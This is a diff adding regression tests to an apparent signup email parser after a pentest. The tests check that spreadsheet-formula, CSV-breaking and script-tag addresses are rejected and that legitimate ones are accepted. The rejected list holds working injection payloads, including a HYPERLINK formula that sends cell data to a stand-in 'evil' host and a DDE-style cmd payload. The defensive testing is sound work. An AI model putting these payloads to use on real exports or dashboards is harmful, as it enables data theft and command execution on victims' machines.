@@ -46,3 +46,35 @@ test("uaHash is a deterministic 16-char hex fingerprint of user-agent + ip", () 
   assert.notEqual(h1, h3);
   assert.match(h1, /^[0-9a-f]{16}$/);
 });
+
+// --- hardening found by pentest 2026-09-07 ----------------------------------
+// The old shape check (/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/) accepted anything without
+// a space or a second @, so spreadsheet-formula and separator payloads reached
+// the admin dashboard and its CSV export.
+test("rejects spreadsheet-formula and CSV-breaking addresses", () => {
+  const attacks = [
+    '=HYPERLINK("http://evil/?x="&A1,"click")@x.co', // formula → data exfiltration on export
+    "+cmd|'/c calc'!A1@x.co",
+    "-2+3+cmd@x.co",
+    "@SUM(1+1)@x.co",
+    "a,b,c@x.co",                                    // breaks CSV columns
+    "<script>alert(1)</script>@x.com",
+  ];
+  for (const email of attacks) {
+    const r = parseSignup({ email, source: "x" });
+    assert.ok("error" in r, `must reject: ${email}`);
+  }
+});
+
+test("still accepts the addresses real people actually use", () => {
+  const legit = [
+    "normal@example.com",
+    "first.last+tag@sub.example.co.uk",
+    "a_b-c@example-site.com",
+    "x!#$%&*@example.io",
+  ];
+  for (const email of legit) {
+    const r = parseSignup({ email, source: "x" });
+    assert.ok(!("error" in r), `must accept: ${email}`);
+  }
+});
